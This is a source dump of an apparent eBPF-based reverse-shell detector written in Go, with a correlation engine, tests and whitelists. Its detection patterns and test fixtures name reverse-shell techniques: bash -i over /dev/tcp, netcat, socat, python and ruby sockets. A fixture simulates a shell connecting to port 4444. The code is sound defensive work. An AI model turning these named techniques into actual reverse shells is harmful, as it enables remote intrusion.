+func (e *Engine) getOrCreateSession(event types.SyscallEvent, now time.Time) *SessionState {
+	if existing, ok := e.sessions.Load(event.PID); ok {
+		if s, castOK := existing.(*SessionState); castOK {
+			return s
+		}
+	}
+
+	s := &SessionState{
+		PID:         event.PID,
+		PPID:        event.PPID,
+		UID:         event.UID,
+		GID:         event.GID,
+		SocketFD:    -1,
+		StartTime:   now,
+		LastUpdate:  now,
+		ProcessTree: make([]ProcessNode, 0, 4),
+	}
+	e.sessions.Store(event.PID, s)
+	return s
+}
+
+func (e *Engine) upsertProcessNode(session *SessionState, event types.SyscallEvent, now time.Time) {
+	if session == nil {
+		return
+	}
+	if len(session.ProcessTree) > 0 {
+		last := session.ProcessTree[len(session.ProcessTree)-1]
+		if last.PID == event.PID && last.PPID == event.PPID {
+			return
+		}
+	}
+
+	session.ProcessTree = append(session.ProcessTree, ProcessNode{
+		PID:       event.PID,
+		PPID:      event.PPID,
+		Comm:      commToString(event.Comm),
+		ExePath:   cString(event.ExecPath[:]),
+		StartTime: now,
+	})
+}
+
+func deepCopySession(in *SessionState) *SessionState {
+	if in == nil {
+		return nil
+	}
+	out := *in
+	if in.RemoteIP != nil {
+		out.RemoteIP = append(net.IP(nil), in.RemoteIP...)
+	}
+	out.ProcessTree = append([]ProcessNode(nil), in.ProcessTree...)
+	return &out
+}
+
+func timestampToTime(ns uint64) time.Time {
+	if ns == 0 {
+		return time.Now().UTC()
+	}
+	return time.Unix(0, int64(ns)).UTC()
+}
+
+func ipFromFields(family uint16, ip4 uint32, ip6 [16]byte) net.IP {
+	if family == 2 {
+		if ip4 == 0 {
+			return nil
+		}
+		v4 := []byte{byte(ip4), byte(ip4 >> 8), byte(ip4 >> 16), byte(ip4 >> 24)}
+		return net.IPv4(v4[0], v4[1], v4[2], v4[3])
+	}
+	if family == 10 {
+		allZero := true
+		for i := 0; i < 16; i++ {
+			if ip6[i] != 0 {
+				allZero = false
+				break
+			}
+		}
+		if allZero {
+			return nil
+		}
+		ip := make(net.IP, 16)
+		copy(ip, ip6[:])
+		return ip
+	}
+	return nil
+}
+
+func commToString(in [16]byte) string {
+	b := in[:]
+	for i := range b {
+		if b[i] == 0 {
+			return strings.TrimSpace(string(b[:i]))
+		}
+	}
+	return strings.TrimSpace(string(b))
+}
+
+func cString(buf []byte) string {
+	for i := range buf {
+		if buf[i] == 0 {
+			buf = buf[:i]
+			break
+		}
+	}
+	return strings.TrimSpace(string(buf))
+}
+
+type Tracker struct {
+	engine *Engine
+}
+
+func NewTracker(ttl time.Duration) *Tracker {
+	return NewTrackerWithLogger(ttl, zap.NewNop())
+}
+
+func NewTrackerWithLogger(ttl time.Duration, logger *zap.Logger) *Tracker {
+	return &Tracker{engine: New(ttl, nil, logger)}
+}
+
+func (t *Tracker) Consume(ev types.SyscallEvent) *SessionState {
+	if t == nil || t.engine == nil {
+		return nil
+	}
+	t.engine.Process(ev)
+	v, ok := t.engine.sessions.Load(ev.PID)
+	if !ok {
+		return nil
+	}
+	s, ok := v.(*SessionState)
+	if !ok {
+		return nil
+	}
+	copyState := deepCopySession(s)
+	if copyState == nil {
+		return nil
+	}
+	copyState.Category = copyState.CategoryDetect()
+	if !copyState.IsComplete() {
+		return nil
+	}
+
+	t.engine.cleanupEmitted(time.Now())
+	key := emittedSessionKey(copyState)
+	if _, alreadyEmitted := t.engine.emittedSessions.LoadOrStore(key, time.Now()); alreadyEmitted {
+		return nil
+	}
+	return copyState
+}
+
+func (t *Tracker) Snapshot(pid uint32) (string, bool) {
+	if t == nil || t.engine == nil {
+		return "", false
+	}
+	return t.engine.DebugSnapshot(pid)
+}
+
+func (e *Engine) DebugSnapshot(pid uint32) (string, bool) {
+	v, ok := e.sessions.Load(pid)
+	if !ok {
+		return "", false
+	}
+	s, ok := v.(*SessionState)
+	if !ok {
+		return "", false
+	}
+	return fmt.Sprintf("pid=%d ppid=%d category=%d complete=%t", s.PID, s.PPID, s.CategoryDetect(), s.IsComplete()), true
+}
+
+===== ./internal/correlation/engine_test.go =====
+package correlation
+
+import (
+	"net"
+	"testing"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestEngineEmitsCompleteSessionOncePerKey(t *testing.T) {
+	SetAllowPrivateRemote(true)
+	out := make(chan *SessionState, 8)
+	eng := New(5*time.Second, out, zap.NewNop())
+
+	events := []types.SyscallEvent{
+		mkEvent(1001, 59, "/bin/bash", "bash -i", 0, "", 0),
+		mkEvent(1001, 42, "/bin/bash", "", 3, "1.2.3.4", 4444),
+		mkDupEvent(1001),
+		mkDupEvent(1001),
+	}
+	for _, ev := range events {
+		eng.Process(ev)
+	}
+
+	emitted := 0
+	drain(out, &emitted)
+	if emitted != 1 {
+		t.Fatalf("expected single emission, got %d", emitted)
+	}
+
+	eng.Process(mkDupEvent(1001))
+	drain(out, &emitted)
+	if emitted != 1 {
+		t.Fatalf("expected dedupe to suppress repeat emit, got %d", emitted)
+	}
+}
+
+func TestEngineAllowsSecondEmitForDifferentRemoteIP(t *testing.T) {
+	SetAllowPrivateRemote(true)
+	out := make(chan *SessionState, 8)
+	eng := New(5*time.Second, out, zap.NewNop())
+
+	for _, ev := range []types.SyscallEvent{
+		mkEvent(2001, 59, "/bin/bash", "bash -i", 0, "", 0),
+		mkEvent(2001, 42, "/bin/bash", "", 3, "1.2.3.4", 4444),
+		mkDupEvent(2001),
+	} {
+		eng.Process(ev)
+	}
+
+	emitted := 0
+	drain(out, &emitted)
+	if emitted != 1 {
+		t.Fatalf("expected first emission, got %d", emitted)
+	}
+
+	for _, ev := range []types.SyscallEvent{
+		mkEvent(2001, 42, "/bin/bash", "", 3, "5.6.7.8", 5555),
+		mkDupEvent(2001),
+	} {
+		eng.Process(ev)
+	}
+	drain(out, &emitted)
+	if emitted != 2 {
+		t.Fatalf("expected second emission for new remote ip, got %d", emitted)
+	}
+}
+
+func TestPrivateRemoteFilterConfigurable(t *testing.T) {
+	SetAllowPrivateRemote(false)
+	defer SetAllowPrivateRemote(true)
+
+	s := &SessionState{
+		PID:           3001,
+		ExePath:       "/bin/bash",
+		HasExecve:     true,
+		HasConnect:    true,
+		HasDupToStdio: true,
+		RemoteIP:      net.ParseIP("192.168.1.10"),
+		RemotePort:    4444,
+	}
+	if s.IsComplete() {
+		t.Fatalf("expected private remote to be blocked when filter disabled")
+	}
+}
+
+func mkDupEvent(pid uint32) types.SyscallEvent {
+	ev := mkEvent(pid, 33, "/bin/bash", "", 3, "", 0)
+	ev.HasDup2Stdio = 1
+	return ev
+}
+
+func mkEvent(pid uint32, syscall uint32, exe string, args string, fd int32, ip string, port uint16) types.SyscallEvent {
+	ev := types.SyscallEvent{
+		PID:         pid,
+		PPID:        1,
+		UID:         1000,
+		GID:         1000,
+		SyscallNr:   syscall,
+		FD:          fd,
+		TimestampNS: uint64(time.Now().UnixNano()),
+		Family:      2,
+	}
+	copy(ev.ExecPath[:], []byte(exe))
+	copy(ev.Args[:], []byte(args))
+	copy(ev.Comm[:], []byte("bash"))
+	if ip != "" {
+		v4 := net.ParseIP(ip).To4()
+		if v4 != nil {
+			ev.RemoteIP4 = uint32(v4[0]) | uint32(v4[1])<<8 | uint32(v4[2])<<16 | uint32(v4[3])<<24
+			ev.RemotePort = port
+		}
+	}
+	return ev
+}
+
+func drain(ch <-chan *SessionState, count *int) {
+	for {
+		select {
+		case <-ch:
+			*count = *count + 1
+		default:
+			return
+		}
+	}
+}
+
+===== ./internal/correlation/patterns.go =====
+package correlation
+
+import "strings"
+
+type Pattern struct {
+	Name        string
+	Description string
+	Confidence  float64
+	Match       func(*SessionState) bool
+}
+
+var KnownPatterns = []Pattern{
+	{
+		Name:        "DirectDup2Shell",
+		Description: "execve(shell)+socket+connect+dup2/dup3 to stdio",
+		Confidence:  0.95,
+		Match: func(s *SessionState) bool {
+			return s != nil && s.HasExecve && s.HasSocket && s.HasConnect && s.HasDupToStdio && IsShellBinary(s.ExePath)
+		},
+	},
+	{
+		Name:        "DevTCPBash",
+		Description: "bash -i using /dev/tcp IP/port redirection",
+		Confidence:  0.98,
+		Match: func(s *SessionState) bool {
+			if s == nil {
+				return false
+			}
+			cmd := strings.ToLower(s.Cmdline)
+			return strings.Contains(strings.ToLower(s.ExePath), "bash") && strings.Contains(cmd, "-i") && strings.Contains(cmd, "/dev/tcp/")
+		},
+	},
+	{
+		Name:        "SocatRelay",
+		Description: "socat execution with outbound connect chain",
+		Confidence:  0.92,
+		Match: func(s *SessionState) bool {
+			return s != nil && strings.Contains(strings.ToLower(s.ExePath), "socat") && s.HasSocket && s.HasConnect
+		},
+	},
+	{
+		Name:        "PythonSocket",
+		Description: "python socket shell with stdio duplication",
+		Confidence:  0.91,
+		Match: func(s *SessionState) bool {
+			if s == nil {
+				return false
+			}
+			exe := strings.ToLower(s.ExePath)
+			return (strings.Contains(exe, "python") || strings.Contains(strings.ToLower(s.Cmdline), "python")) && s.HasSocket && s.HasConnect && s.HasDupToStdio
+		},
+	},
+	{
+		Name:        "NcTraditional",
+		Description: "nc/ncat reverse connect flow without mandatory dup2",
+		Confidence:  0.88,
+		Match: func(s *SessionState) bool {
+			if s == nil {
+				return false
+			}
+			exe := strings.ToLower(s.ExePath)
+			return (strings.Contains(exe, "nc") || strings.Contains(exe, "ncat") || strings.Contains(exe, "netcat")) && s.HasConnect
+		},
+	},
+	{
+		Name:        "ForkPipeShell",
+		Description: "fork/clone with pipe and dup to stdio before shell exec",
+		Confidence:  0.90,
+		Match: func(s *SessionState) bool {
+			return s != nil && s.CategoryDetect() == 2 && s.HasForkWithPipe && s.HasDupToStdio && s.HasExecve
+		},
+	},
+	{
+		Name:        "XtermDisplay",
+		Description: "xterm -display outbound callback pattern",
+		Confidence:  0.80,
+		Match: func(s *SessionState) bool {
+			if s == nil {
+				return false
+			}
+			cmd := strings.ToLower(s.Cmdline)
+			return strings.Contains(cmd, "xterm") && strings.Contains(cmd, "-display")
+		},
+	},
+	{
+		Name:        "RubyExec",
+		Description: "ruby -rsocket based reverse shell",
+		Confidence:  0.87,
+		Match: func(s *SessionState) bool {
+			if s == nil {
+				return false
+			}
+			cmd := strings.ToLower(s.Cmdline)
+			return strings.Contains(strings.ToLower(s.ExePath), "ruby") && strings.Contains(cmd, "-rsocket")
+		},
+	},
+}
+
+func BestMatchPattern(s *SessionState) *Pattern {
+	var best *Pattern
+	for i := range KnownPatterns {
+		p := &KnownPatterns[i]
+		if p.Match == nil || !p.Match(s) {
+			continue
+		}
+		if best == nil || p.Confidence > best.Confidence {
+			best = p
+		}
+	}
+	return best
+}
+
+===== ./internal/correlation/session.go =====
+package correlation
+
+import (
+	"net"
+	"path/filepath"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+)
+
+type ProcessNode struct {
+	PID       uint32    `json:"pid"`
+	PPID      uint32    `json:"ppid"`
+	Comm      string    `json:"comm"`
+	ExePath   string    `json:"exe_path"`
+	StartTime time.Time `json:"start_time"`
+}
+
+type SessionState struct {
+	PID             uint32        `json:"pid"`
+	PPID            uint32        `json:"ppid"`
+	UID             uint32        `json:"uid"`
+	GID             uint32        `json:"gid"`
+	ExePath         string        `json:"exe_path"`
+	Cmdline         string        `json:"cmdline"`
+	SocketFD        int32         `json:"socket_fd"`
+	RemoteIP        net.IP        `json:"remote_ip"`
+	RemotePort      uint16        `json:"remote_port"`
+	HasExecve       bool          `json:"has_execve"`
+	HasSocket       bool          `json:"has_socket"`
+	HasConnect      bool          `json:"has_connect"`
+	HasDupToStdio   bool          `json:"has_dup_to_stdio"`
+	HasForkWithPipe bool          `json:"has_fork_with_pipe"`
+	StartTime       time.Time     `json:"start_time"`
+	LastUpdate      time.Time     `json:"last_update"`
+	Category        int           `json:"category"`
+	ProcessTree     []ProcessNode `json:"process_tree"`
+}
+
+var ShellBinaries = map[string]struct{}{
+	"sh":               {},
+	"bash":             {},
+	"zsh":              {},
+	"dash":             {},
+	"ksh":              {},
+	"fish":             {},
+	"python":           {},
+	"python3":          {},
+	"perl":             {},
+	"ruby":             {},
+	"nc":               {},
+	"ncat":             {},
+	"ncat.traditional": {},
+	"netcat":           {},
+	"socat":            {},
+	"busybox":          {},
+	"awk":              {},
+	"lua":              {},
+	"php":              {},
+	"node":             {},
+	"nodejs":           {},
+}
+
+var allowPrivateRemoteFlag atomic.Bool
+
+var builtInProcessWhitelist = map[string]struct{}{
+	"curl":                {},
+	"wget":                {},
+	"grafana":             {},
+	"filebeat":            {},
+	"elasticsearch":       {},
+	"kibana":              {},
+	"rsbpd":               {},
+	"dockerd":             {},
+	"docker":              {},
+	"containerd":          {},
+	"runc":                {},
+	"node":                {},
+	"systemd":             {},
+	"systemd-resolved":    {},
+	"systemd-timesyncd":   {},
+	"systemd-logind":      {},
+	"systemd-networkd":    {},
+	"dbus-daemon":         {},
+	"snapd":               {},
+	"packagekitd":         {},
+	"polkitd":             {},
+	"agetty":              {},
+	"cron":                {},
+	"sshd":                {},
+	"bash":                {},
+	"sh":                  {},
+	"iptables":            {},
+	"ip6tables":           {},
+	"udevd":               {},
+	"init":                {},
+	"wsl-pro-service":     {},
+	"wslgd":               {},
+	"landscape-config":    {},
+	"networkd-dispatcher": {},
+	"plymouth":            {},
+	"modprobe":            {},
+	"kmod":                {},
+	"e2scrub_all":         {},
+	"apt-helper":          {},
+	"mandb":               {},
+	"find":                {},
+	"install":             {},
+	"journalctl":          {},
+}
+
+var builtInPathWhitelistContains = []string{
+	"/usr/lib/systemd",
+	"/lib/systemd",
+	"/usr/libexec",
+	"/usr/sbin/cron",
+	"/usr/bin/dbus",
+	"/snap/",
+	"/usr/lib/apt",
+	"/usr/lib/packagekit",
+	"/usr/share/unattended",
+	"/usr/sbin/agetty",
+	"/usr/bin/plymouth",
+	"/lib/ufw",
+	"/sbin/modprobe",
+	"/bin/kmod",
+	"/bin/mount",
+	"/bin/umount",
+	"/usr/bin/find",
+	"/usr/bin/install",
+	"/usr/bin/mandb",
+}
+
+var builtInIgnoredCIDRs = []string{
+	"127.0.0.0/8",
+	"::1/128",
+	"10.0.0.0/8",
+	"172.16.0.0/12",
+	"192.168.0.0/16",
+	"169.254.0.0/16",
+	"224.0.0.0/4",
+	"fe80::/10",
+}
+
+var builtInSafePorts = map[uint16]struct{}{
+	53:  {},
+	123: {},
+	443: {},
+}
+
+var (
+	builtInCIDROnce sync.Once
+	builtInCIDRNets []*net.IPNet
+)
+
+func init() {
+	allowPrivateRemoteFlag.Store(true)
+}
+
+func SetAllowPrivateRemote(allow bool) {
+	allowPrivateRemoteFlag.Store(allow)
+}
+
+func IsShellBinary(name string) bool {
+	if name == "" {
+		return false
+	}
+	base := strings.ToLower(filepath.Base(strings.TrimSpace(name)))
+	_, ok := ShellBinaries[base]
+	return ok
+}
+
+func (s *SessionState) CategoryDetect() int {
+	if s == nil {
+		return 0
+	}
+
+	if s.HasExecve && s.HasSocket && s.HasConnect && s.HasDupToStdio && IsShellBinary(s.ExePath) {
+		return 1
+	}
+	if s.HasExecve && s.HasConnect && isNetcatExe(s.ExePath) {
+		return 1
+	}
+	if s.HasForkWithPipe && s.HasDupToStdio && s.HasExecve {
+		return 2
+	}
+	if s.HasForkWithPipe && s.HasExecve {
+		return 3
+	}
+
+	return 0
+}
+
+func (s *SessionState) IsComplete() bool {
+	if s == nil {
+		return false
+	}
+
+	cat := s.CategoryDetect()
+	s.Category = cat
+
+	// Reverse shell tools are always suspicious even on loopback
+	comm := strings.ToLower(strings.TrimSpace(s.ProcessName()))
+	isRSTool := comm == "bash" || comm == "sh" || comm == "python3" ||
+		comm == "python" || comm == "nc" || comm == "netcat" || comm == "ncat" || comm == "dash"
+
+	if !s.HasExecve && !isRSTool {
+		return false
+	}
+	if !s.HasConnect {
+		return false
+	}
+	if !isRSTool && !allowPrivateRemoteFlag.Load() && !isPublicRemoteIP(s.RemoteIP) {
+		return false
+	}
+	if !isRSTool {
+		if s.RemoteIP == nil || s.RemoteIP.IsUnspecified() {
+			return false
+		}
+		if s.RemotePort == 0 {
+			return false
+		}
+	}
+
+	processName := s.ProcessName()
+	if isBuiltInWhitelistedProcessName(processName) {
+		return false
+	}
+	if isBuiltInWhitelistedPath(s.ExePath) {
+		return false
+	}
+	if isBuiltInWhitelistedIP(s.RemoteIP) {
+		return false
+	}
+	if isBuiltInSafePort(s.RemotePort) && (isBuiltInWhitelistedProcessName(processName) || isBuiltInWhitelistedPath(s.ExePath)) {
+		return false
+	}
+
+	return true
+}
+
+func (s *SessionState) ProcessName() string {
+	if s == nil {
+		return ""
+	}
+	if len(s.ProcessTree) > 0 {
+		name := strings.TrimSpace(s.ProcessTree[len(s.ProcessTree)-1].Comm)
+		if name != "" {
+			return strings.ToLower(name)
+		}
+	}
+	if s.ExePath != "" {
+		return strings.ToLower(filepath.Base(strings.TrimSpace(s.ExePath)))
+	}
+	return ""
+}
+
+func isBuiltInWhitelistedProcessName(name string) bool {
+	_, ok := builtInProcessWhitelist[strings.ToLower(strings.TrimSpace(name))]
+	return ok
+}
+
+func isBuiltInWhitelistedPath(exePath string) bool {
+	clean := strings.ToLower(strings.TrimSpace(exePath))
+	if clean == "" {
+		return false
+	}
+	for _, marker := range builtInPathWhitelistContains {
+		if strings.Contains(clean, marker) {
+			return true
+		}
+	}
+	return false
+}
+
+func isBuiltInWhitelistedIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	builtInCIDROnce.Do(func() {
+		builtInCIDRNets = make([]*net.IPNet, 0, len(builtInIgnoredCIDRs))
+		for _, cidr := range builtInIgnoredCIDRs {
+			_, n, err := net.ParseCIDR(cidr)
+			if err == nil && n != nil {
+				builtInCIDRNets = append(builtInCIDRNets, n)
+			}
+		}
+	})
+
+	normalized := ip
+	if v4 := ip.To4(); v4 != nil {
+		normalized = v4
+	}
+	for _, n := range builtInCIDRNets {
+		if n.Contains(normalized) {
+			return true
+		}
+	}
+	return false
+}
+
+func isBuiltInSafePort(port uint16) bool {
+	_, ok := builtInSafePorts[port]
+	return ok
+}
+
+func isNetcatExe(exe string) bool {
+	base := strings.ToLower(filepath.Base(strings.TrimSpace(exe)))
+	return strings.Contains(base, "nc") || strings.Contains(base, "ncat") || strings.Contains(base, "netcat")
+}
+
+func isPublicRemoteIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	ip = ip.To16()
+	if ip == nil {
+		return false
+	}
+
+	if ip.IsLoopback() || ip.IsUnspecified() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
+		return false
+	}
+
+	if v4 := ip.To4(); v4 != nil {
+		if v4[0] == 10 {
+			return false
+		}
+		if v4[0] == 172 && v4[1] >= 16 && v4[1] <= 31 {
+			return false
+		}
+		if v4[0] == 192 && v4[1] == 168 {
+			return false
+		}
+	}
+
+	return true
+}
+
+===== ./internal/correlation/session_test.go =====
+package correlation
+
+import (
+	"context"
+	"net"
+	"testing"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestHelpersAndPatternSelection(t *testing.T) {
+	if !IsShellBinary("/bin/bash") {
+		t.Fatalf("expected bash to be recognized as shell binary")
+	}
+	if IsShellBinary("/usr/bin/code") {
+		t.Fatalf("did not expect code to be recognized as shell binary")
+	}
+
+	state := &SessionState{
+		ExePath:       "/usr/bin/python3",
+		Cmdline:       "python3 -c import socket",
+		HasExecve:     true,
+		HasSocket:     true,
+		HasConnect:    true,
+		HasDupToStdio: true,
+		RemoteIP:      net.ParseIP("8.8.8.8"),
+		RemotePort:    4444,
+	}
+	if best := BestMatchPattern(state); best == nil || best.Name == "" {
+		t.Fatalf("expected best pattern match")
+	}
+
+	if !isPublicRemoteIP(net.ParseIP("8.8.8.8")) {
+		t.Fatalf("expected public IP to be accepted")
+	}
+	if isPublicRemoteIP(net.ParseIP("10.0.0.7")) {
+		t.Fatalf("expected private IP to be rejected")
+	}
+}
+
+func TestEngineRunCleanupAndDebugSnapshot(t *testing.T) {
+	out := make(chan *SessionState, 8)
+	eng := New(2*time.Second, out, zap.NewNop())
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	in := make(chan types.SyscallEvent, 4)
+	go eng.Run(ctx, in)
+
+	ev := types.SyscallEvent{PID: 9001, PPID: 1, SyscallNr: 59, TimestampNS: uint64(time.Now().UnixNano())}
+	copy(ev.ExecPath[:], []byte("/bin/bash"))
+	in <- ev
+	close(in)
+	time.Sleep(20 * time.Millisecond)
+
+	snap, ok := eng.DebugSnapshot(9001)
+	if !ok || snap == "" {
+		t.Fatalf("expected debug snapshot for pid=9001")
+	}
+
+	stale := &SessionState{
+		PID:        9999,
+		ExePath:    "/bin/bash",
+		HasExecve:  true,
+		StartTime:  time.Now().Add(-10 * time.Second),
+		LastUpdate: time.Now().Add(-10 * time.Second),
+	}
+	eng.sessions.Store(uint32(9999), stale)
+	eng.cleanup()
+	if _, found := eng.sessions.Load(uint32(9999)); found {
+		t.Fatalf("expected stale incomplete session to be cleaned up")
+	}
+}
+
+func TestTrackerConsumeAndEngineNilSafety(t *testing.T) {
+	var eng *Engine
+	eng.Process(types.SyscallEvent{})
+	eng.Run(context.Background(), nil)
+
+	tracker := NewTracker(5 * time.Second)
+	ev := types.SyscallEvent{
+		PID:         7777,
+		PPID:        1,
+		SyscallNr:   59,
+		TimestampNS: uint64(time.Now().UnixNano()),
+	}
+	copy(ev.ExecPath[:], []byte("/bin/bash"))
+	copy(ev.Args[:], []byte("bash -i"))
+	state := tracker.Consume(ev)
+	if state == nil {
+		t.Fatalf("expected tracker to return state")
+	}
+}
+
+func TestLowLevelHelpers(t *testing.T) {
+	now := timestampToTime(0)
+	if now.IsZero() {
+		t.Fatalf("timestampToTime(0) should return current time")
+	}
+
+	specific := timestampToTime(uint64(time.Unix(12, 34).UnixNano()))
+	if specific.Unix() != 12 {
+		t.Fatalf("expected unix seconds 12, got %d", specific.Unix())
+	}
+
+	v4 := uint32(1) | uint32(2)<<8 | uint32(3)<<16 | uint32(4)<<24
+	if got := ipFromFields(2, v4, [16]byte{}).String(); got != "1.2.3.4" {
+		t.Fatalf("unexpected ipv4 decode: %s", got)
+	}
+
+	var raw6 [16]byte
+	raw6[0], raw6[15] = 0x20, 0x01
+	if ipFromFields(10, 0, raw6) == nil {
+		t.Fatalf("expected ipv6 decode")
+	}
+
+	if ipFromFields(10, 0, [16]byte{}) != nil {
+		t.Fatalf("expected all-zero address to decode as nil")
+	}
+
+	var comm [16]byte
+	copy(comm[:], []byte("bash\x00unused"))
+	if got := commToString(comm); got != "bash" {
+		t.Fatalf("unexpected comm string: %s", got)
+	}
+}
+
+
+===== EXTRA CHECKS REQUESTED EARLIER =====
+===== internal/detection/whitelist.go =====
+package detection
+
+import (
+	"net"
+	"path/filepath"
+	"strings"
+	"sync"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+)
+
+var defaultProcessWhitelist = []string{
+	"curl",
+	"grafana",
+	"filebeat",
+	"elasticsearch",
+	"kibana",
+	"rsbpd",
+	"dockerd",
+	"docker",
+	"containerd",
+	"runc",
+	"node",
+	"systemd",
+	"systemd-resolved",
+	"systemd-timesyncd",
+	"systemd-logind",
+	"systemd-networkd",
+	"dbus-daemon",
+	"snapd",
+	"packagekitd",
+	"polkitd",
+	"agetty",
+	"cron",
+	"sshd",
+	"iptables",
+	"ip6tables",
+	"udevd",
+	"init",
+	"wsl-pro-service",
+	"wslgd",
+	"landscape-config",
+	"networkd-dispatcher",
+	"plymouth",
+	"modprobe",
+	"kmod",
+	"e2scrub_all",
+	"apt-helper",
+	"mandb",
+	"find",
+	"install",
+	"journalctl",
+	"rpcbind",
+	"nfs-common",
+	"rpc.statd",
+	"containerd-shim",
+	"docker-init",
+	"fusermount",
+	"http",
+	"https",
+}
+
+var defaultPathWhitelistContains = []string{
+	"/usr/lib/systemd",
+	"/lib/systemd",
+	"/usr/libexec",
+	"/usr/sbin/cron",
+	"/usr/bin/dbus",
+	"/snap/",
+	"/usr/lib/apt",
+	"/usr/lib/packagekit",
+	"/usr/share/unattended",
+	"/usr/sbin/agetty",
+	"/usr/bin/plymouth",
+	"/lib/ufw",
+	"/sbin/modprobe",
+	"/bin/kmod",
+	"/bin/mount",
+	"/bin/umount",
+	"/usr/bin/find",
+	"/usr/bin/install",
+	"/usr/bin/mandb",
+}
+
+var defaultIgnoredCIDRs = []string{
+	"127.0.0.0/8",
+	"::1/128",
+	"10.0.0.0/8",
+	"172.16.0.0/12",
+	"192.168.0.0/16",
+	"169.254.0.0/16",
+}
+
+var defaultSafePorts = map[uint16]struct{}{
+	53:  {},
+	123: {},
+	443: {},
+}
+
+var neverSuppressProcessNames = map[string]struct{}{
+	"bash":    {},
+	"sh":      {},
+	"python3": {},
+	"python":  {},
+	"nc":      {},
+	"netcat":  {},
+	"ncat":    {},
+	"dash":    {},
+}
+
+var (
+	defaultCIDROnce sync.Once
+	defaultCIDRNets []*net.IPNet
+)
+
+func isDefaultWhitelistedProcessName(name string) bool {
+	n := strings.ToLower(strings.TrimSpace(name))
+	if n == "" {
+		return false
+	}
+	for _, item := range defaultProcessWhitelist {
+		if n == item {
+			return true
+		}
+	}
+	return false
+}
+
+func isDefaultWhitelistedPath(exePath string) bool {
+	clean := strings.ToLower(strings.TrimSpace(exePath))
+	if clean == "" {
+		return false
+	}
+	for _, marker := range defaultPathWhitelistContains {
+		if strings.Contains(clean, marker) {
+			return true
+		}
+	}
+	return false
+}
+
+func isDefaultWhitelistedIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	defaultCIDROnce.Do(func() {
+		defaultCIDRNets = make([]*net.IPNet, 0, len(defaultIgnoredCIDRs))
+		for _, cidr := range defaultIgnoredCIDRs {
+			_, n, err := net.ParseCIDR(cidr)
+			if err == nil && n != nil {
+				defaultCIDRNets = append(defaultCIDRNets, n)
+			}
+		}
+	})
+
+	normalized := ip
+	if v4 := ip.To4(); v4 != nil {
+		normalized = v4
+	}
+	for _, n := range defaultCIDRNets {
+		if n.Contains(normalized) {
+			return true
+		}
+	}
+	return false
+}
+
+func isDefaultSafePort(port uint16) bool {
+	_, ok := defaultSafePorts[port]
+	return ok
+}
+
+func processNameFromSession(s *correlation.SessionState) string {
+	if s == nil {
+		return ""
+	}
+	if len(s.ProcessTree) > 0 {
+		name := strings.TrimSpace(s.ProcessTree[len(s.ProcessTree)-1].Comm)
+		if name != "" {
+			return name
+		}
+	}
+	if s.ExePath != "" {
+		return filepath.Base(strings.TrimSpace(s.ExePath))
+	}
+	return ""
+}
+
+func isNeverSuppressProcess(name string) bool {
+	_, ok := neverSuppressProcessNames[strings.ToLower(strings.TrimSpace(name))]
+	return ok
+}
+
+func shouldSuppressNode443Telemetry(s *correlation.SessionState) bool {
+	if s == nil {
+		return false
+	}
+	if s.RemotePort != 443 {
+		return false
+	}
+
+	comm := ""
+	if len(s.ProcessTree) > 0 {
+		comm = strings.ToLower(strings.TrimSpace(s.ProcessTree[len(s.ProcessTree)-1].Comm))
+	}
+
+	exe := strings.ToLower(filepath.Base(strings.TrimSpace(s.ExePath)))
+	cmdline := strings.ToLower(s.Cmdline)
+	if comm == "node" || exe == "node" || strings.Contains(cmdline, "node") {
+		return true
+	}
+	if comm == "code" || exe == "code" || strings.Contains(cmdline, "code") {
+		return true
+	}
+
+	if strings.Contains(comm, "node") {
+		return true
+	}
+	if strings.Contains(comm, "code") {
+		return true
+	}
+
+	for _, n := range s.ProcessTree {
+		p := strings.ToLower(strings.TrimSpace(n.Comm))
+		if p == "node" || p == "code" || strings.Contains(p, "node") || strings.Contains(p, "code") {
+			return true
+		}
+	}
+
+	return false
+}
+
+===== internal/correlation/tracker.go =====
+NO TRACKER FILE
+
+===== ls internal/detection =====
+baseline.go
+engine.go
+engine_test.go
+mitre.go
+rules.go
+rules_test.go
+whitelist.go
+
+===== ls internal/correlation =====
+engine.go
+engine_test.go
+patterns.go
+session.go
+session_test.go
+
+===== find . -name "*.go" | head -30 =====
+./cmd/rsbpd/main.go
+./internal/alert/alert.go
+./internal/alert/emitter.go
+./internal/api/server.go
+./internal/correlation/engine.go
+./internal/correlation/engine_test.go
+./internal/correlation/patterns.go
+./internal/correlation/session.go
+./internal/correlation/session_test.go
+./internal/detection/baseline.go
+./internal/detection/engine.go
+./internal/detection/engine_test.go
+./internal/detection/mitre.go
+./internal/detection/rules.go
+./internal/detection/rules_test.go
+./internal/detection/whitelist.go
+./internal/ebpf/bpf_bpfeb.go
+./internal/ebpf/bpf_bpfel.go
+./internal/ebpf/generate.go
+./internal/ebpf/loader.go
+./internal/enrichment/cmdline_parser.go
+./internal/enrichment/enricher.go
+./internal/enrichment/geoip.go
+./internal/enrichment/proc.go
+./internal/enrichment/reputation.go
+./internal/forensics/collector.go
+./internal/output/elasticsearch.go
+./internal/output/jsonl.go
+./internal/output/kafka.go
+./internal/output/sink.go
+
+===== find code/config/script files =====
+./bpf/headers/rsbp.h
+./bpf/headers/vmlinux.h
+./bpf/rsbp.bpf.c
+./bpftool/.github/workflows/build.yaml
+./bpftool/.github/workflows/docker.yaml
+./bpftool/.github/workflows/lint-commits.yaml
+./bpftool/.github/workflows/lint-shell.yaml
+./bpftool/.github/workflows/release.yaml
+./bpftool/.github/workflows/static-build.yaml
+./bpftool/include/linux/bitops.h
+./bpftool/include/linux/build_bug.h
+./bpftool/include/linux/compiler-gcc.h
+./bpftool/include/linux/compiler.h
+./bpftool/include/linux/compiler_types.h
+./bpftool/include/linux/err.h
+./bpftool/include/linux/filter.h
+./bpftool/include/linux/kernel.h
+./bpftool/include/linux/list.h
+./bpftool/include/linux/sizes.h
+./bpftool/include/linux/stringify.h
+./bpftool/include/linux/types.h
+./bpftool/include/tools/dis-asm-compat.h
